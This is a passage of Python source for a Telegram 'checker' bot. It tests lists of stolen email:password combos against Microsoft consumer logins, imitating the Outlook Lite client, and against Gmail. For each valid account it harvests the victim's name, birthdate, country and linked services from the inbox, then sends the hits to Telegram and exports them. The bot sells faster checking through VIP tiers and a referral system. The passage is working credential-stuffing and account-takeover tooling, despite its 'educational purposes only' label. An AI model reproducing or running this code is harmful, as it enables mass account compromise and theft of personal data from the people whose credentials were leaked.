            if account_line not in existing_accounts:
                with open(filename, 'a', encoding='utf-8') as f:
                    f.write(account_line)
        else:
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(account_line)
        with lock:
            if service_name in linked_accounts:
                linked_accounts[service_name] += 1
            else:
                linked_accounts[service_name] = 1

# ---- get_capture (verbatim from checker.py) ----
def get_capture(email, password, token, cid):
    global hit, processed
    try:
        headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Pragma": "no-cache",
            "Accept": "application/json",
            "ForceSync": "false",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "Host": "substrate.office.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
        response = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=30).json()
        name = response.get('names', [{}])[0].get('displayName', 'Unknown')
        country = response.get('accounts', [{}])[0].get('location', 'Unknown')
        flag = get_flag(country)
        try:
            birthdate = "{:04d}-{:02d}-{:02d}".format(
                response["accounts"][0]["birthYear"],
                response["accounts"][0]["birthMonth"],
                response["accounts"][0]["birthDay"]
            )
        except (KeyError, IndexError):
            birthdate = "Unknown"
        url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
        headers = {
            "Host": "outlook.live.com",
            "content-length": "0",
            "x-owa-sessionid": f"{cid}",
            "x-req-source": "Mini",
            "authorization": f"Bearer {token}",
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36",
            "action": "StartupData",
            "x-owa-correlationid": f"{cid}",
            "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
            "content-type": "application/json; charset=utf-8",
            "accept": "*/*",
            "origin": "https://outlook.live.com",
            "x-requested-with": "com.microsoft.outlooklite",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://outlook.live.com/",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US,en;q=0.9"
        }
        inbox_response = requests.post(url, headers=headers, data="", timeout=30).text
        linked_services = []
        for service_name, service_info in services.items():
            sender = service_info["sender"]
            if sender in inbox_response:
                count = inbox_response.count(sender)
                linked_services.append(f"[✔] {service_name} (Messages: {count})")
                save_account_by_type(service_name, email, password)
        linked_services_str = "\n".join(linked_services) if linked_services else "[×] No linked services found."
        capture = f"""
~~~~~~~~~~~~~~ Account INFO ~~~~~~~~~~~~~~
Email : {email}
Password : {password}

Name : {name}
Country : {flag} {country}
Birthdate : {birthdate}

Linked Services :
{linked_services_str}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"""
        with open(HOTMAIL_HITS_PATH, 'a', encoding='utf-8') as f:
            f.write(capture)
        with lock:
            hit += 1
            processed += 1
    except Exception as e:
        with lock:
            processed += 1

# ---- check_account (verbatim from checker.py) ----
def check_account(email, password):
    """Fixed login flow with better error handling"""
    try:
        session = requests.Session()
        url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
        r1 = session.get(url1, headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9)"}, timeout=15)
        if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
            return {"status": "BAD"}
        url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        r2 = session.get(url2, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, timeout=15)
        url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
        if not url_match or not ppft_match:
            return {"status": "BAD"}
        post_url = url_match.group(1).replace("\\/", "/")
        ppft = ppft_match.group(1)
        login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
        r3 = session.post(post_url, data=login_data, headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": "https://login.live.com",
            "Referer": r2.url
        }, allow_redirects=False, timeout=15)
        if any(x in r3.text for x in ["account or password is incorrect", "error", "Incorrect password", "Invalid credentials"]):
            return {"status": "BAD"}
        if any(url in r3.text for url in ["identity/confirm", "Abuse", "signedout", "locked"]):
            return {"status": "BAD"}
        location = r3.headers.get("Location", "")
        if not location:
            return {"status": "BAD"}
        code_match = re.search(r'code=([^&]+)', location)
        if not code_match:
            return {"status": "BAD"}
        code = code_match.group(1)
        token_data = {
            "client_info": "1",
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            "grant_type": "authorization_code",
            "code": code,
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
        }
        r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, timeout=15)
        if r4.status_code != 200 or "access_token" not in r4.text:
            return {"status": "BAD"}
        token_json = r4.json()
        access_token = token_json["access_token"]
        mspcid = None
        for cookie in session.cookies:
            if cookie.name == "MSPCID":
                mspcid = cookie.value
                break
        cid = mspcid.upper() if mspcid else str(uuid.uuid4()).upper()
        get_capture(email, password, access_token, cid)
        return {"status": "HIT"}
    except requests.exceptions.Timeout:
        return {"status": "RETRY"}
    except Exception as e:
        return {"status": "RETRY"}

# ---- check_combo (verbatim from checker.py) ----
def check_combo(email, password):
    global hit, bad, retry, processed
    account_id = f"{email}:{password}"
    if account_id in checked_accounts:
        with lock:
            processed += 1
        return
    checked_accounts.add(account_id)
    with rate_limit_semaphore:
        time.sleep(random.uniform(0.01, 0.05))
        result = check_account(email, password)
        with lock:
            if result["status"] == "HIT":
                hit += 1
            elif result["status"] == "BAD":
                bad += 1
            elif result["status"] == "RETRY":
                retry += 1
            else:
                bad += 1
            processed += 1

# ====================== GMAIL CHECKER (async) ======================
async def check_gmail(email, password):
    try:
        async with httpx.AsyncClient(verify=False) as client:
            resp = await client.post("https://accounts.google.com/ServiceLoginAuth",
                                     data={"Email": email, "Passwd": password}, timeout=15)
            if "myaccount.google.com" in resp.text or resp.status_code == 200:
                return {"status": "HIT", "type": "gmail"}
            else:
                return {"status": "BAD", "type": "gmail"}
    except:
        return {"status": "RETRY", "type": "gmail"}

async def get_gmail_capture(email, password, chat_id):
    try:
        capture = (
            f"\n~~~~~~~~~~~~~~ Account INFO ~~~~~~~~~~~~~~\n"
            f"Email : {email}\n"
            f"Password : {password}\n\n"
            f"Name : Gmail Account\n"
            f"Country : 🏳 Unknown\n"
            f"Birthdate : Unknown\n\n"
            f"Linked Services :\n"
            f"[✔] Gmail Services\n"
            f"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
        )
        await application.bot.send_message(chat_id=chat_id, text=capture.strip())
        with open('Gmail-Hits.txt', 'a', encoding='utf-8') as f:
            f.write(capture)
    except:
        pass

# ====================== COMBINED DISPATCHER ======================
async def check_microsoft(email: str, password: str, active_services=None, chat_id: int = 0) -> CheckResult:
    """
    Dispatcher — routes to the correct checker based on email domain.
    Hotmail/Outlook/Live → check_account (real OAuth, verbatim from checker.py)
                           get_capture writes to Hotmail-Hits.txt in exact format
                           bot reads new content and sends it to Telegram
    Gmail               → check_gmail (async) + get_gmail_capture
    Other               → BAD
    (Educational purposes only)
    """
    domain = email.lower()

    # --- Hotmail / Outlook / Live ---
    if any(d in domain for d in ["@hotmail.", "@outlook.", "@live."]):
        # Record file byte-position before calling check_account so we can
        # read only the NEW capture written by get_capture (exact format)
        file_pos = 0
        try:
            if os.path.exists('Hotmail-Hits.txt'):
                with open('Hotmail-Hits.txt', 'rb') as _f:
                    _f.seek(0, 2)
                    file_pos = _f.tell()
        except Exception:
            pass

        result = await asyncio.to_thread(check_account, email, password)

        if result.get("status") == "HIT":
            # Send to Telegram the exact capture text written by get_capture
            if chat_id:
                try:
                    with open('Hotmail-Hits.txt', 'r', encoding='utf-8') as _f:
                        _f.seek(file_pos)
                        new_capture = _f.read().strip()
                    if new_capture:
                        await application.bot.send_message(chat_id=chat_id, text=new_capture)
                except Exception:
                    pass
            return CheckResult(
                status="HIT", email=email, password=password,
                name="Unknown", country="Unknown", flag="🏳",
                linkedServices=[], hasServices=False,
            )
        elif result.get("status") == "BAD":
            return CheckResult(status="BAD", email=email, password=password)
        else:
            return CheckResult(status="RETRY")

    # --- Gmail ---
    elif "@gmail." in domain:
        result = await check_gmail(email, password)
        if result.get("status") == "HIT":
            await get_gmail_capture(email, password, chat_id)
            return CheckResult(
                status="HIT", email=email, password=password,
                name="Gmail Account", country="Unknown", flag="🏳",
                linkedServices=[], hasServices=False,
            )
        elif result.get("status") == "BAD":
            return CheckResult(status="BAD", email=email, password=password)
        else:
            return CheckResult(status="RETRY")

    # --- Unsupported domain ---
    else:
        return CheckResult(status="BAD", email=email, password=password)


def format_hit(r: CheckResult, total_hit: int) -> str:
    sep = "〰〰〰〰〰〰〰〰〰〰〰〰"
    svcs = "\n".join([f"[✔] {s}" for s in r.linkedServices]) if r.linkedServices else "[×] No linked services found."
    return (
        f"🔱 <b>HOTMAIL HIT #{total_hit}</b> 🔱\n{sep}\n"
        f"📧 <b>Email:</b> <code>{esc(r.email or '')}</code>\n"
        f"🔐 <b>Password:</b> <code>{esc(r.password or '')}</code>\n"
        f"👤 <b>Name:</b> {esc(r.name or 'Unknown')}\n"
        f"🎂 <b>Birthdate:</b> {esc(r.birthdate or 'Unknown')}\n"
        f"🌍 <b>Country:</b> {r.flag} {esc(r.country or 'Unknown')}\n"
        f"{sep}\n"
        f"🔗 <b>Linked Services:</b>\n<code>{esc(svcs)}</code>\n"
        f"{sep}"
    )

# --- Bot + helpers ---
application: Optional[Application] = None # Will be initialized in startup

def esc(t: Union[str, int]) -> str:
    return str(t).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def b(t: Union[str, int]) -> str:
    return f"<b>{esc(t)}</b>"

def code(t: Union[str, int]) -> str:
    return f"<code>{esc(t)}</code>"

def get_setting(key: str) -> Optional[str]:
    row = cursor.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
    return row["value"] if row else None

def set_setting(key: str, value: str):
    cursor.execute("INSERT OR REPLACE INTO settings (key,value) VALUES (?,?)", (key, value))
    conn.commit()

def get_user(user_id: int) -> Optional[Dict[str, Any]]:
    row = cursor.execute("SELECT * FROM users WHERE chat_id=?", (user_id,)).fetchone()
    return dict(row) if row else None

def ensure_user(msg: telegram.Message):
    cursor.execute(
        "INSERT OR IGNORE INTO users (chat_id,username,first_name,joined_at) VALUES (?,?,?,?)",
        (msg.chat.id, msg.from_user.username or "", msg.from_user.first_name or "User", int(time.time() * 1000))
    )
    conn.commit()

def is_vip(user: Optional[Dict[str, Any]]) -> bool:
    if not user:
        return False
    return bool(user.get("is_vip") and (user.get("vip_expires_at") == -1 or user.get("vip_expires_at") == -2 or user.get("vip_expires_at", 0) > int(time.time() * 1000)))

def format_expiry(user: Optional[Dict[str, Any]]) -> str:
    if not user or not user.get("is_vip"):
        return "None"
    if user["vip_expires_at"] == -1:
        return "Lifetime"
    if user["vip_expires_at"] == -2:
        return "🏆 Leaderboard #1"
    
    remaining_ms = user["vip_expires_at"] - int(time.time() * 1000)
    if remaining_ms <= 0:
        return "Expired"
    
    days = remaining_ms // 86400000
    hours = (remaining_ms % 86400000) // 3600000
    return f"{days}d {hours}h"

def days_label(d: int) -> str:
    if d == 1: return "1 Day"
    if d == 3: return "3 Days"
    if d == 7: return "7 Days"
    if d == 30: return "30 Days"
    return f"{d} Days"

async def send(chat_id: int, text: str, reply_markup: Optional[InlineKeyboardMarkup] = None):
    try:
        if application and application.bot:
            await application.bot.send_message(chat_id=chat_id, text=text, parse_mode="HTML", reply_markup=reply_markup)
    except telegram.error.TelegramError as e:
        logger.error(f"[BOT] send to {chat_id}: {e}")

async def edit_msg(chat_id: int, message_id: int, text: str, reply_markup: Optional[InlineKeyboardMarkup] = None):
    try:
        if application and application.bot:
            await application.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode="HTML", reply_markup=reply_markup)
    except telegram.error.BadRequest as e:
        if "message is not modified" not in str(e) and "message to edit not found" not in str(e):
            logger.error(f"[BOT] edit_msg to {chat_id}: {e}")
            try:
                await application.bot.send_message(chat_id=chat_id, text=text, parse_mode="HTML", reply_markup=reply_markup)
            except Exception:
                pass
    except telegram.error.TelegramError as e:
        logger.error(f"[BOT] edit_msg fallback {chat_id}: {e}")

async def show_qr(chat_id: int, old_msg_id: int, caption: str, reply_markup: InlineKeyboardMarkup):
    try:
        if application and application.bot:
            await application.bot.delete_message(chat_id=chat_id, message_id=old_msg_id)
    except telegram.error.TelegramError:
        pass # Ignore if message already deleted or not found

    qr_id = get_setting("qr_file_id")
    if qr_id:
        try:
            if application and application.bot:
                await application.bot.send_photo(chat_id=chat_id, photo=qr_id, caption=caption, parse_mode="HTML", reply_markup=reply_markup)
            return
        except telegram.error.TelegramError as e:
            logger.error(f"[BOT] show_qr send_photo error: {e}")
    await send(chat_id, caption, reply_markup=reply_markup)

# --- Menus ---
def main_menu(chat_id: int) -> InlineKeyboardMarkup:
    queue_count = len(check_queue)
    queue_label = f"📋 Queue ({queue_count} waiting)" if queue_count > 0 else "📋 Queue"
    btns: List[List[InlineKeyboardButton]] = [
        [InlineKeyboardButton("📦 Stock", callback_data="stock"), InlineKeyboardButton("💥 Hits", callback_data="hits_menu")],
        [InlineKeyboardButton("🛒 Buy", callback_data="buy"), InlineKeyboardButton("🎯 Start Check", callback_data="start_check")],
        [InlineKeyboardButton("⚡ Speed", callback_data="speed"), InlineKeyboardButton("🔍 Services", callback_data="services_menu")],
        [InlineKeyboardButton("📊 Stats", callback_data="stats"), InlineKeyboardButton(queue_label, callback_data="queue_status")],
        [InlineKeyboardButton("🎯 My Hits", callback_data="my_hits"), InlineKeyboardButton("👤 My Profile", callback_data="my_profile")],
        [InlineKeyboardButton("🔗 Referral", callback_data="referral"), InlineKeyboardButton("🎁 Redeem", callback_data="redeem")],
        [InlineKeyboardButton("💎 Buy VIP", callback_data="buy_vip"), InlineKeyboardButton("🏆 Leaderboard", callback_data="leaderboard")],
        [InlineKeyboardButton("🆘 Support", callback_data="support")],
    ]
    if is_admin(chat_id):
        btns.append([InlineKeyboardButton("🔧 Admin Panel", callback_data="admin_panel")])
    return InlineKeyboardMarkup(btns)

def admin_menu(chat_id: int = 0) -> InlineKeyboardMarkup:
    buttons = [
        [InlineKeyboardButton("➕ Add Product", callback_data="admin_add_product"), InlineKeyboardButton("💥 Add Hit", callback_data="admin_add_hit")],
        [InlineKeyboardButton("📦 View Products", callback_data="admin_view_products"), InlineKeyboardButton("🎯 View Hits", callback_data="admin_view_hits")],
        [InlineKeyboardButton("🖼️ Set QR Image", callback_data="admin_set_qr"), InlineKeyboardButton("💎 Set VIP Prices", callback_data="admin_set_prices")],
        [InlineKeyboardButton("👥 View Users", callback_data="admin_view_users"), InlineKeyboardButton("📊 Bot Stats", callback_data="admin_stats")],
        [InlineKeyboardButton("⏳ Pending Payments", callback_data="admin_pending_payments"), InlineKeyboardButton("💎 Grant VIP", callback_data="admin_grant_vip")],
        [InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban_user"), InlineKeyboardButton("✅ Unban User", callback_data="admin_unban_user")],
        [InlineKeyboardButton("❌ Revoke VIP", callback_data="admin_revoke_vip"), InlineKeyboardButton("🔍 Search User", callback_data="admin_search_user")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"), InlineKeyboardButton("📌 Channels", callback_data="admin_channels")],
        [InlineKeyboardButton("🎁 Add Points", callback_data="admin_add_points"), InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")],
    ]
    if chat_id in SUPER_ADMIN_IDS:
        buttons.insert(-1, [InlineKeyboardButton("👤 Manage Admins", callback_data="admin_manage_admins")])
    return InlineKeyboardMarkup(buttons)

# --- Multi-channel helpers ---
def get_channels() -> List[ChannelEntry]:
    try:
        raw = get_setting("required_channels")
        if raw:
            return [ChannelEntry(**d) for d in json.loads(raw)]
        # Migrate legacy single channel
        legacy = get_setting("required_channel")
        if legacy:
            entry = parse_channel_input(legacy)
            if entry:
                arr = [entry]
                set_setting("required_channels", json.dumps([e.model_dump() for e in arr]))
                cursor.execute("DELETE FROM settings WHERE key='required_channel'")
                conn.commit()
                return arr
        return []
    except Exception as e:
        logger.error(f"Error getting channels: {e}")
        return []

def save_channels(channels: List[ChannelEntry]):
    set_setting("required_channels", json.dumps([e.model_dump() for e in channels]))

def parse_channel_input(input_str: str) -> Optional[ChannelEntry]:
    text = input_str.strip()
    if re.match(r"^-?\d{5,}$", text):
        channel_id = text if text.startswith("-") else f"-100{text}"
        return ChannelEntry(id=channel_id, link="", label=f"Private ({channel_id})")
    
    clean = text.replace("https://", "").replace("http://", "").replace("t.me/", "")
    if clean.startswith("+"):
        link = f"https://t.me/{clean}"
        return ChannelEntry(id=None, link=link, label="Private Channel")
    
    username = clean if clean.startswith("@") else f"@{clean}"
    link = f"https://t.me/{username[1:]}"
    return ChannelEntry(id=username, link=link, label=username)

async def is_member_of_all_channels(chat_id: int) -> Dict[str, Any]:
    channels = get_channels()
    if not channels:
        return {"ok": True, "missing": []}
    
    missing: List[ChannelEntry] = []
    for ch in channels:
        if not ch.id:
            continue # Private invite link, cannot check membership directly
        try:
            if application and application.bot:
                member = await application.bot.get_chat_member(chat_id=ch.id, user_id=chat_id)
                if member.status not in ["member", "administrator", "creator"]:
                    missing.append(ch)
            else:
                missing.append(ch) # If bot not initialized, assume missing
        except telegram.error.TelegramError as e:
            logger.error(f"[BOT] get_chat_member error for {ch.id}: {e}")
            missing.append(ch)
    return {"ok": not missing, "missing": missing}

async def send_join_prompt(chat_id: int):
    channels = get_channels()
    buttons = [[InlineKeyboardButton(f"📢 Join {ch.label}", url=ch.link)] for ch in channels]
    buttons.append([InlineKeyboardButton("✅ I've Joined All", callback_data="check_membership")])
    await send(chat_id,
        f"🚫 <b>Access Restricted</b>\n\nYou must join {len(channels) == 1 and 'our channel' or 'all required channels'} to use this bot.\n\nAfter joining, press the button below to continue.",
        reply_markup=InlineKeyboardMarkup(buttons)
    )

def back_btn(to: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data=to)]])

user_state: Dict[int, Dict[str, Any]] = {}

# --- Bot Handlers ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    ensure_user(update.effective_message)

    # Process referral BEFORE channel check so points are always awarded
    param = context.args[0] if context.args else None
    if param and param.startswith("ref_"):
        try:
            rid = int(param.replace("ref_", ""))
            if rid != chat_id:
                referrer = get_user(rid)
                if not referrer:
                    logger.info(f"Referral ignored because referrer does not exist: {rid}")
                    raise ValueError("unknown referrer")
                existing_referral = cursor.execute("SELECT id FROM referrals WHERE referred_id=?", (chat_id,)).fetchone()
                if not existing_referral:
                    cursor.execute("UPDATE users SET referral_points=COALESCE(referral_points,0)+1 WHERE chat_id=?", (rid,))
                    if cursor.rowcount < 1:
                        conn.rollback()
                        logger.info(f"Referral ignored because points update affected no rows: {rid}")
                        return
                    cursor.execute("INSERT INTO referrals (referrer_id,referred_id,points_awarded,created_at) VALUES (?,?,?,?)",
                                   (rid, chat_id, 1, int(time.time() * 1000)))
                    cursor.execute("UPDATE users SET referred_by=? WHERE chat_id=?", (rid, chat_id))
                    conn.commit()

                    ref_user = get_user(rid)
                    pts = ref_user.get("referral_points", 0) if ref_user else 0
                    await send(rid,
                        f"🎉 Someone joined via your referral!\n\n"
                        f"🔗 Your points: {b(pts)}\n\n"
                        f"<i>• {POINTS_PER_CHECK} points = 1 free file check\n"
                        f"• {POINTS_PER_VIP2D} points = 2 days VIP\n\n"
                        f"Tap 🎁 Redeem to use your points!</i>"
                    )
                    await update_leaderboard_vip()
        except ValueError:
            pass # Invalid referral ID
        except Exception as e:
            logger.error(f"Error processing referral for {chat_id}: {e}")

    if not is_admin(chat_id) and not (await is_member_of_all_channels(chat_id))["ok"]:
        await send_join_prompt(chat_id)
        return

    user = get_user(chat_id)
    vip_stat = "💎 VIP" if is_vip(user) else "👤 Free"
    pts = user.get("referral_points", 0) if user else 0
    fc = user.get("free_checks", 0) if user else 0
    await send(chat_id,
        f"✅ {b('Welcome to Kakashi Checker Bot!')}\n\nStatus: {vip_stat}\nPoints: {pts} | Free Checks: {fc}\n\nPick an option below:",
        reply_markup=main_menu(chat_id)
    )

async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id not in SUPER_ADMIN_IDS:
        await send(chat_id, "🚫 Only super admins can use this command.")
        return
    
    if not context.args or not context.args[0].isdigit():
        await send(chat_id, f"❌ Usage: {code('/addadmin <ChatID>')}\nExample: {code('/addadmin 123456789')}")
        return
    
    target_id = int(context.args[0])
    if is_admin(target_id):
        await send(chat_id, f"ℹ️ User {code(target_id)} is already an admin.")
        return
    
    add_extra_admin(target_id)
    target_user = get_user(target_id)
    un = f"@{esc(target_user['username'])}" if target_user and target_user["username"] else esc(target_user["first_name"]) if target_user else str(target_id)
    await send(chat_id, f"✅ {b(un)} [{code(target_id)}] has been {b('added as admin')}.\n\nThey now have full admin access.")
    try:
        await send(target_id, f"🔧 {b('You have been made an Admin!')}\n\nYou now have full admin access to this bot.\n\nUse /admin to open the admin panel.")
    except Exception as e:
        logger.error(f"Error sending admin notification to {target_id}: {e}")

async def removeadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id not in SUPER_ADMIN_IDS:
        await send(chat_id, "🚫 Only super admins can use this command.")
        return
    
    if not context.args or not context.args[0].isdigit():
        await send(chat_id, f"❌ Usage: {code('/removeadmin <ChatID>')}\nExample: {code('/removeadmin 123456789')}")
        return
    
    target_id = int(context.args[0])
    if target_id in SUPER_ADMIN_IDS:
        await send(chat_id, "🚫 Cannot remove a super admin.")
        return
    if not is_admin(target_id):
        await send(chat_id, f"ℹ️ User {code(target_id)} is not an admin.")
        return
    
    remove_extra_admin(target_id)
    target_user = get_user(target_id)
    un = f"@{esc(target_user['username'])}" if target_user and target_user["username"] else esc(target_user["first_name"]) if target_user else str(target_id)
    await send(chat_id, f"✅ {b(un)} [{code(target_id)}] has been {b('removed as admin')}.")
    try:
        await send(target_id, f"ℹ️ Your {b('admin access has been revoked')}.\n\nContact a super admin if you believe this is a mistake.")
    except Exception as e:
        logger.error(f"Error sending admin notification to {target_id}: {e}")

async def listadmins_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if not is_admin(chat_id):
        await send(chat_id, "🚫 You are not authorized to use this command.")
        return
    
    all_admins = get_admin_ids()
    lines = []
    for admin_id in all_admins:
        target_user = get_user(admin_id)
        un = f"@{esc(target_user['username'])}" if target_user and target_user["username"] else esc(target_user["first_name"]) if target_user else "Unknown"
        tag = " 👑 Super" if admin_id in SUPER_ADMIN_IDS else " 🔧 Admin"
        lines.append(f"• {un} [{code(admin_id)}]{tag}")
    
    await send(chat_id, f"🔧 {b('Current Admins')} ({len(all_admins)})\n\n" + "\n".join(lines))

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if not is_admin(chat_id):
        await send(chat_id, "🚫 You are not authorized to use this command.")
        return
    ensure_user(update.effective_message)
    
    tot = cursor.execute("SELECT COUNT(*) as c FROM users").fetchone()["c"]
    vips = cursor.execute("SELECT COUNT(*) as c FROM users WHERE is_vip=1 AND (vip_expires_at=-1 OR vip_expires_at>?)", (int(time.time() * 1000),)).fetchone()["c"]
    tot_h = cursor.execute("SELECT COUNT(*) as c FROM hits").fetchone()["c"]
    pend = cursor.execute("SELECT COUNT(*) as c FROM pending_payments WHERE status='pending_admin'").fetchone()["c"]
    await send(chat_id,
        f"🔧 {b('Admin Panel')}\n\n👥 Users: {tot} | 💎 VIP: {vips}\n✅ Hits: {tot_h} | ⏳ Pending: {pend}\n\nSelect an option:",
        reply_markup=admin_menu(chat_id)
    )


async def export_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Export all hits as a .zip file (admin only)."""
    chat_id = update.effective_chat.id
    if not is_admin(chat_id):
        await send(chat_id, "🚫 Admin only.")
        return
    rows = cursor.execute("SELECT email, password, name, country, flag, linked_services FROM hits ORDER BY created_at DESC").fetchall()
    if not rows:
        await send(chat_id, "📭 No hits to export.")
        return
    csv = "email,password,name,country\n" + "\n".join(f"{r['email']},{r['password']},{r['name']},{r['country']}" for r in rows)
    txt = "\n".join(f"{r['email']}:{r['password']}" for r in rows)
    import io as _io
    import zipfile as _zipfile
    buf = _io.BytesIO()
    with _zipfile.ZipFile(buf, 'w', _zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("hits_export.csv", csv)
        zf.writestr("hits_combos.txt", txt)
    buf.seek(0)
    try:
        import io as _io2
        file_bytes = _io.BytesIO(buf.getvalue())
        file_bytes.name = f"kakashi_hits_{int(time.time())}.zip"
        await application.bot.send_document(chat_id=chat_id, document=file_bytes,
            caption=f"📦 <b>{len(rows)} Hits Exported</b>\n• hits_export.csv\n• hits_combos.txt", parse_mode="HTML")
    except Exception as e:
        await send(chat_id, f"❌ Export failed: {e}")




async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Global error handler for unhandled exceptions."""
    logger.error(f"[BOT] Unhandled exception: {context.error}", exc_info=context.error)
    if update and hasattr(update, 'effective_chat') and update.effective_chat:
        try:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="⚠️ Something went wrong. Please try again.",
                parse_mode="HTML"
            )
        except Exception:
            pass


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show all available commands."""
    chat_id = update.effective_chat.id
    ensure_user(update.effective_message)
    user = get_user(chat_id)
    admin = is_admin(chat_id)
    vip = is_vip(user)

    sep = "━━━━━━━━━━━━━━━━━━━━━"
    text = (
        f"📖 <b>Help — All Commands</b>\n{sep}\n\n"
        f"<b>👤 General Commands:</b>\n"
        f"/start  — Open main menu\n"
        f"/help   — This help message\n"
        f"/id     — Show your Chat ID & info\n"
        f"/ping   — Check bot latency\n"
        f"\n{sep}\n\n"
        f"<b>🎯 How to Check Combos:</b>\n"
        f"1️⃣ Tap <b>🎯 Start Check</b> in menu\n"
        f"2️⃣ Send a <code>.txt</code> file with combos\n"
        f"3️⃣ Format: <code>email:password</code> (one per line)\n"
        f"4️⃣ Bot checks each & reports hits!\n"
        f"\n<b>⚡ Speed Tiers:</b>\n"
        f"🐢 Slow (30) → 🚶 Medium (80) → 🏃 Fast (150)\n"
        f"⚡ Superfast (250) 💎 → 🚀 Ultra (400) 💎\n"
        f"\n{sep}\n\n"
        f"<b>🔗 Referral System:</b>\n"
        f"• Earn 1 point per referral\n"
        f"• 3 pts = 1 free file check\n"
        f"• 20 pts = 2 days VIP\n"
        f"• #1 on leaderboard = free VIP! 🏆\n"
    )

    if admin:
        text += (
            f"\n{sep}\n\n"
            f"<b>🔧 Admin Commands:</b>\n"
            f"/admin       — Open admin panel\n"
            f"/export      — Export all hits as .zip\n"
            f"/addadmin    — Add admin (super only)\n"
            f"/removeadmin — Remove admin (super only)\n"
            f"/listadmins  — View all admins\n"
        )

    text += (
        f"\n{sep}\n"
        f"<i>Status: {'💎 VIP' if vip else '👤 Free'} | Developer: @ReallyTsugikuni</i>"
    )

    await send(chat_id, text, reply_markup=InlineKeyboardMarkup([
        [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
    ]))

async def ping_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Quick bot health check."""
    import time as _t
    start = _t.monotonic()
    msg = await update.effective_message.reply_text("🏓 Pong!")
    latency = (_t.monotonic() - start) * 1000
    await msg.edit_text(f"🏓 <b>Pong!</b>\n⚡ Latency: <code>{latency:.0f}ms</code>", parse_mode="HTML")


async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Cancel current operation."""
    chat_id = update.effective_chat.id
    ensure_user(update.effective_message)
    if chat_id in user_state:
        del user_state[chat_id]
    await send(chat_id, "❌ Operation cancelled.", reply_markup=main_menu(chat_id))

async def id_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show the user their Telegram Chat ID."""
    chat_id = update.effective_chat.id
    username = update.effective_user.username or ""
    name = update.effective_user.first_name or "User"
    await send(chat_id,
        f"🆔 <b>Your Info</b>\n\n"
        f"👤 Name: <b>{esc(name)}</b>\n"
        f"📛 Username: {'@' + esc(username) if username else 'Not set'}\n"
        f"🔑 Chat ID: <code>{chat_id}</code>\n\n"
        f"<i>Use this Chat ID for admin setup in .env</i>"
    )

async def callback_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    msg = query.message
    chat_id = msg.chat.id
    msg_id = msg.message_id
